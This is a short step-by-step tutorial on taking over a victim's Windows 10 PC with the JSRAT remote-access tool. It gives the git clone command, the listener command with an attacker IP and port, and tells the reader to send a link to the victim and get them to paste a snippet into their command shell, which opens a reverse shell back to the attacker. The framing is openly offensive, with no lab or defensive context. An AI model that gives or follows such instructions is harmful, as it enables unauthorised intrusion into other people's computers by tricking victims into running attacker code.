Hack Remote Windows 10 PC using JSRAT

JSRAT is a python Script that can be used to get a remote shell of victim pc.  
Open terminal and Type
git clone https://github.com/Hood3dRob1n/JSRat-Py.git

Now go to the jsrat foler using cd JSRAT-Py and the following command to run jsrat
./JSRAT.py  –i  192.168.0.140 –p 80

Now Server is Up and Listening. Copy Client Command link i.e. http://192.168.0.140:80/wtf and send it to the victim. As the victim opens the link in the browser a snippet will appear like this.

Copy that snippet and paste in the cmd shell of victim.

As soon as the victim executes it you will get a reverse connection back in your kali terminal.

From here you can dig into the System as deep as you want. For Further details check this link.
